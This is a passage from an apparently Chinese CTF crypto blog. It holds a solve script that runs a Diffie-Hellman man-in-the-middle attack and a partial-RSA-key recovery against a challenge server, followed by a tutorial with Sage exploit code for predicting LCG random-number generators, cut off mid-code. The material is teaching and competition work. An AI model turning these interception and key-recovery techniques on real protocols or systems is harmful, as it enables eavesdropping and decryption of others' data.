class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">217534615279223294476101434763509239207</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">state = <span class="literal">False</span></span><br><span class="line"><span class="comment"># global N_factor</span></span><br><span class="line">q = <span class="literal">None</span></span><br><span class="line">io = remote(<span class="string">"121.40.247.133"</span>, <span class="string">"28419"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adapt_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> message.ljust(<span class="number">16</span> - len(message) % <span class="number">16</span> + len(message), <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_flag</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"encrypted flag: b'"</span>)</span><br><span class="line">    encrypted_flag = b64decode(io.recvuntil(<span class="string">"'"</span>))</span><br><span class="line">    print(<span class="string">"Enc_flag:"</span>, encrypted_flag)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_RSA_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"e = "</span>)</span><br><span class="line">    e = int(io.recvline())</span><br><span class="line">    print(<span class="string">"e:"</span>, str(e))</span><br><span class="line">    io.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    n = int(io.recvline())</span><br><span class="line">    print(<span class="string">"n:"</span>, str(n))</span><br><span class="line">    io.recvuntil(<span class="string">"partial d: "</span>)</span><br><span class="line">    d0 = int(io.recvline()) <span class="comment">#low 1050bits</span></span><br><span class="line">    print(<span class="string">"d0:"</span>, str(d0))</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (e, n, d0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_connect</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting [++++++++++++++++]"</span>)</span><br><span class="line">    gamma = <span class="number">1551</span></span><br><span class="line">    keyG = pow(g, gamma, p)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    keyA = int(io.recvline())</span><br><span class="line">    print(keyA)</span><br><span class="line">    io.sendlineafter(<span class="string">"A: "</span>, str(keyG))</span><br><span class="line">    io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">    keyB = int(io.recvline())</span><br><span class="line">    io.sendlineafter(<span class="string">"B: "</span>, str(keyG))</span><br><span class="line">    keyC = pow(keyB, gamma, p) <span class="comment">#BG通信</span></span><br><span class="line">    keyS = pow(keyA, gamma, p) <span class="comment">#AG通信</span></span><br><span class="line">    keyC = long_to_bytes(keyC).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    keyS = long_to_bytes(keyS).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipherC = AES.new(keyC, AES.MODE_ECB)</span><br><span class="line">    cipherS = AES.new(keyS, AES.MODE_ECB)</span><br><span class="line">    print(<span class="string">"keyC:"</span>, keyC)</span><br><span class="line">    print(<span class="string">"keyS:"</span>, keyS)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (cipherC, cipherS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_conversation</span><span class="params">(cipherC, cipherS)</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">        messageA = io.recvline().strip()</span><br><span class="line">        messageA = long_to_bytes(int(messageA, <span class="number">16</span>))</span><br><span class="line">        messageA = cipherS.decrypt(messageA.rjust((<span class="number">16</span> - len(messageA) % <span class="number">16</span>) % <span class="number">16</span> + len(messageA), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"A:"</span>, messageA)</span><br><span class="line">        randnum_begin = messageA.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageA.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageA[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        new_messageA = messageA[:randnum_begin] + randnum</span><br><span class="line">        new_messageA = adapt_message(new_messageA)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageA)</span><br><span class="line">        s = cipherC.encrypt(new_messageA)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"A: "</span>, s)</span><br><span class="line">        io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">        messageB = io.recvline().strip()</span><br><span class="line">        messageB = long_to_bytes(int(messageB, <span class="number">16</span>))</span><br><span class="line">        messageB = cipherC.decrypt(messageB.rjust((<span class="number">16</span> - len(messageB) % <span class="number">16</span>) % <span class="number">16</span> + len(messageB), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"B:"</span>, messageB)</span><br><span class="line">        randnum_begin = messageB.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageB.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageB[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            new_messageB = <span class="string">b'I want to get my AES-key.\ntimestamp:'</span> + randnum</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_messageB = messageB[:randnum_begin] + randnum</span><br><span class="line">        new_messageB = adapt_message(new_messageB)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageB)</span><br><span class="line">        s = cipherS.encrypt(new_messageB)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"B: "</span>, s)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    res = io.recvline().strip()</span><br><span class="line">    res = long_to_bytes(int(res, <span class="number">16</span>))</span><br><span class="line">    res = cipherS.decrypt(res.rjust((<span class="number">16</span> - len(res) % <span class="number">16</span>) % <span class="number">16</span> + len(res), <span class="string">b'\x00'</span>))</span><br><span class="line">    print(res)</span><br><span class="line">    enc_begin = res.find(<span class="string">b'key: '</span>) + <span class="number">5</span></span><br><span class="line">    enc_end = res.find(<span class="string">b'\ntimestamp'</span>)</span><br><span class="line">    enc = res[enc_begin:enc_end]</span><br><span class="line">    print(<span class="string">'enc:'</span>, enc)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation completed [++++++++++++++++]"</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(<span class="number">1400</span>-kbits), beta=<span class="number">0.65</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">if</span> ZZ(p):</span><br><span class="line">            q = int(p)</span><br><span class="line">            state = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/&#123;&#125;"</span>.format(k, e), end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> p0 &gt; <span class="number">1</span> <span class="keyword">and</span> n % p0 == <span class="number">0</span>:</span><br><span class="line">                q = int(p0)</span><br><span class="line">                state = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            daemon_thread = threading.Thread(target=partial_p, args=(p0,kbits,n,), daemon=<span class="literal">True</span>)</span><br><span class="line">            daemon_thread.start()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    encrypted_flag = get_encrypted_flag()</span><br><span class="line">    (e, n, d0) = gen_RSA_key()</span><br><span class="line">    (cipherC, cipherS) = MITM_connect()</span><br><span class="line">    c = MITM_conversation(cipherC, cipherS)</span><br><span class="line">    print(<span class="string">"RSA_enc_key:"</span>, c)</span><br><span class="line">    d0 = Integer(d0)</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    find_p(d0, kbits, e, n)</span><br><span class="line">    p = n // q</span><br><span class="line">    d = inverse(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    print(<span class="string">"[+] d = &#123;&#125;"</span>.format(d))</span><br><span class="line">    key = long_to_bytes(pow(c, d, n))</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    print(aes.decrypt(encrypted_flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more">[More]</h4><p><span class="math inline">\(size(e)=10\)</span>，也可能是虚拟机里跑sage不太可，脚本跑的时间看人品-.-</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(PRNG)</title>
      <link href="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/"/>
      <url>/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/</url>
      
        <content type="html"><![CDATA[<h3 id="lcg---basis">LCG - Basis</h3><h4 id="theorem">Theorem</h4><p>[前置知识]</p><p><span class="math inline">\(S_{n+1}\equiv aS_{n}+b(mod\ m)\)</span>，<span class="math inline">\(S_{0}\)</span>为对应种子.</p><p>在<span class="math inline">\(F_{m}\)</span>上（m取大素数），若<span class="math inline">\(gcd(a,m)=1\)</span>，则周期<span class="math inline">\(T=ord_{m}(a)\)</span>.</p><p>所以选取系数时应尽量使得a为模m的原根，以此尽量延长LCG周期，同时也要避免<span class="math inline">\(S_{0}=S_{bad}\)</span>.</p><h3 id="lcg---unknown-a-b">LCG - Unknown (a, b)</h3><h4 id="theorem-1">Theorem</h4><p><span class="math inline">\(S_{n+1}\equiv aS_{n}+b(mod\ m)\)</span>，(a, b)未知，m已知.</p><p>则只要给出连续三个生成值<span class="math inline">\(s_{0},s_{1},s_{2}\)</span>即可求解（等价于给出两个<span class="math inline">\(F_{m}\)</span>上的模方程）</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-12-02.png"></p><p>虽然求解上述方程组很容易，但这里介绍一组求模等式方程组的通法.</p><p>该方法基于LLL，对构造的格基进行约化.</p><p>e.g. 对上述方程组构造如下矩阵：</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-30-12.png"></p><p>我们希望格基约化后能得到一个行向量，满足前两个元素为0.</p><p>且为了在约化后的矩阵中得到直观的a, b，邻接上一个<span class="math inline">\(\frac{E}{m}\)</span>（这里不用单位矩阵E的原因，是因为最好使得包含a(-a),b(-b)的行向量的长度尽可能短，也就是说更大的分母也是允许的）.</p><p>在LLL约化后，只要找到满足下列要求的行向量r，即求解成功：</p><ul><li>r[0] = r[1] = 0</li><li>r[-1] = 1(-1)</li></ul><p><span class="math inline">\(\rightarrow m\cdot r[2]=a(-a),m\cdot r[3]=b(-b)\)</span>.</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix([</span><br><span class="line">    [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">    [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">    [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">])</span><br><span class="line">A = A.LLL()</span><br><span class="line">a = <span class="literal">None</span></span><br><span class="line">b = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">            a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[*] No solves"</span>)</span><br><span class="line">a %= m</span><br><span class="line">b %= m</span><br></pre></td></tr></table></figure><h4 id="more">More</h4><p>构造矩阵进行LLL约化是在解决模等式和CVP等问题时很实用的方法，应熟练掌握.</p><h3 id="lcg---unknown-a-b-m">LCG - Unknown (a, b, m)</h3><h4 id="theorem-2">Theorem</h4><p>在乘数，增量和模数均未知时，对任意N，由取得的连续N个数据构成的N个模方程均有N+3个未知元. 因此不能以上述方法求解，因此用下述方法进行Module_crack.</p><p>假设我们有一组数据data = <span class="math inline">\(\{k_{i}N\}\)</span>(N为大素数，<span class="math inline">\(k_{i}\)</span>为<span class="math inline">\(F_{N}\)</span>下的随机数)，则reduce(GCD, data)很大概率即为N或N乘上一些很小的因子.（<span class="math inline">\(\because\)</span> 假设len(data)=n，则在<span class="math inline">\(k_{i}\)</span>视作完全随机的情况下，reduce(GCD, data)有除N外的素因子p的概率约为<span class="math inline">\(\frac{1}{p^{n}}\)</span>，<span class="math inline">\(\therefore\)</span> 在p或n足够大的时候该方法能有效求解N）</p><p>引入序列<span class="math inline">\(T_{n}=S_{n+1}-S_{n}\)</span></p><p><span class="math inline">\(T_{n+1}=S_{n+2}-S_{n+1}=a(S_{n+1}-S_{n})=aT_{n}(mod\ m)\)</span></p><p><span class="math inline">\(T_{n+2}=S_{n+3}-S_{n+2}=a(S_{n+2}-S_{n+1})=aT_{n+1}=a^{2}T_{n}(mod\ m)\)</span></p><p><span class="math inline">\(\therefore T_{n}T_{n+2}-T_{n+1}^{2}=0(mod\ m)\)</span></p><p>因此只要我们能拿到连续<span class="math inline">\(n(n\geq 6)\)</span>组数据，即可对module进行有效攻击. 后续即转为上一个情形的LCG攻击.</p><h4 id="exp-1">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        m = getPrime(<span class="number">256</span>)</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        b = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        seed = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">        self._state = seed</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">m = reduce(GCD, m_mul)</span><br><span class="line">factors = factor(m)</span><br><span class="line"><span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">        <span class="keyword">if</span> size(prime) == <span class="number">256</span>:</span><br><span class="line">            m = prime</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        m //= (prime**degree)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jump to Unknown (a, b) case</span></span><br></pre></td></tr></table></figure><h4 id="link">Link</h4><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="noopener">https://tailcall.net/blog/cracking-randomness-lcgs/</a></p><h3 id="lcg---truncated-given-a-b-m">LCG - Truncated (Given a, b, m)</h3><h4 id="theorem-3">Theorem</h4><p>Truncated LCG可以表示如下:</p><p><span class="math inline">\(x_{i}=2^{\beta\cdot size(m)}y_{i}+z_{i}\)</span>，<span class="math inline">\(\beta\)</span>为discarded bits的比例因子，使用的随机数流仅为<span class="math inline">\(y_{i}s\)</span>，在给出部分连续<span class="math inline">\(y_{i}\)</span>和(a, b, m)的情况下，我们能有效恢复出<span class="math inline">\(z_{i}\)</span>，从而预测接下来的随机数流.</p><p>首先讨论一类求解模等式组的问题，可以表示为 <span class="math display">\[\sum^{k}_{j=1}a_{ij}x_{j}=c_{i}(mod\ M),i\in\{1,...,k\}\]</span> 如果此时我们对系数矩阵A进行格基约化，即AL=LLL(A)，则 <span class="math display">\[\sum^{k}_{j=1}a&#39;_{ij}x_{j}=c&#39;_{i}(mod\ M)\\C&#39;=A.solve\_left(AL)\cdot C\]</span> 因为AL为约简基，所以也同时有效减小<span class="math inline">\(k_{i}(Mk_{i}+c_{i}=\sum^{k}_{j=1}a_{ij}x_{j})\)</span>.（约化后可视作<span class="math inline">\(k\rightarrow k_{min}\)</span>）</p><p>令<span class="math inline">\(delta\_X=[x_{1}-x_{0},x_{2}-x_{1},...,x_{n}-x_{n-1}]^{T}\)</span></p><p><span class="math inline">\(delta\_Y=[2^{\beta\cdot size(m)}(y_{1}-y_{0}),2^{\beta\cdot size(m)}(y_{2}-y_{1}),...,2^{\beta\cdot size(m)}(y_{n}-y_{n-1})]^{T}\)</span></p><p><span class="math inline">\(delta\_Z=[z_{1}-z_{0},z_{2}-z_{1},...,z_{n}-z_{n-1}]\)</span></p><p><span class="math inline">\(\because x_{i+1}-x_{i}=a^{i}(x_{1}-x_{0})\quad(mod\ m)\)</span></p><p><span class="math inline">\(\therefore\)</span> 构造矩阵A如下 <span class="math display">\[\left[\begin{matrix}m &amp; 0 &amp; 0 &amp; ... &amp; 0\\a &amp; -1 &amp; 0 &amp; ... &amp; 0\\a^{2} &amp; 0 &amp; -1 &amp; ... &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ...\\a^{n} &amp; 0 &amp; 0 &amp; ... &amp; -1\end{matrix}\right]\]</span> <span class="math inline">\(A\cdot delta\_X=0(mod\ m),AL=LLL(A)\)</span></p><p><span class="math inline">\(AL\cdot delta\_X=0(mod\ m),AL\cdot delta\_X=m\cdot [k_{0},...,k_{n-1}]^{T}\)</span></p><p><span class="math inline">\(AL\cdot(delta\_Y+delta\_Z)=m\cdot [k_{0},...,k_{n-1}]^{T}\)</span></p><p>则此时满足：<span class="math inline">\(k\rightarrow k_{min}\)</span>，因为delta_Z未知，我们只能利用delta_Y进行估值，可以做个粗略估计</p><p>AL中每个元大小近似取作<span class="math inline">\(det(AL)^{\frac{1}{n}}=m^{\frac{1}{n}}\)</span>，而<span class="math inline">\(size(delta\_Z[i])\leq\beta\cdot size(m)\)</span>，因此</p><p><span class="math inline">\(nm^{\frac{1}{n}}2^{\beta\cdot size(m)}&lt;m\Rightarrow\)</span> 在m足够大时，n可忽略不计（一般取10即可），即<span class="math inline">\(\beta&lt;\frac{n-1}{n}\)</span></p><p>在上述条件满足时，可视作<span class="math inline">\(AL\cdot delta\_Z&lt;|m|\)</span>（但只是大致估计）</p><p>因此<span class="math inline">\(k_{i}=round((AL\cdot delta\_Y)_{i}/m)\)</span>，求得<span class="math inline">\(k_{i}\)</span>后，<span class="math inline">\(delta\_Z=AL.solve\_right(mk-AL\cdot delta\_Y)\)</span>，delta_X获知，即可推出种子破解整个truncated LCG.</p><h4 id="exp-2">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prng = LCG(<span class="number">128</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line">leak_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    leak_data.append(data[i] - data[i] % <span class="number">2</span>^<span class="number">48</span>)</span><br><span class="line">print(prng.export_key())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed, a, b, m)</span>:</span></span><br><span class="line">    x = seed % m</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (a * x + b) % m</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[51]:</span></span><br><span class="line">a = <span class="number">94105412428421315937226606524092193902</span></span><br><span class="line">b = <span class="number">272271222013811783094314393442542793059</span></span><br><span class="line">m = <span class="number">335812331024081385414724338959789210621</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">A[<span class="number">0</span>, <span class="number">0</span>] = m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    A[i, <span class="number">0</span>] = a^i</span><br><span class="line">    A[i, i] = <span class="number">-1</span></span><br><span class="line">AL = A.LLL()</span><br><span class="line">delta_Y = vector([leak_data[i + <span class="number">1</span>] - leak_data[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">W1 = AL * delta_Y</span><br><span class="line">W2 = vector([round(RR(w) / m) * m - w <span class="keyword">for</span> w <span class="keyword">in</span> W1])</span><br><span class="line">delta_Z = AL.solve_right(W2)</span><br><span class="line">delta_X = delta_Y + delta_Z</span><br><span class="line">x0 = (inverse(a - <span class="number">1</span>, m) * (delta_X[<span class="number">0</span>] - b)) % m</span><br><span class="line">rand_iter = lcg(x0, a, b, 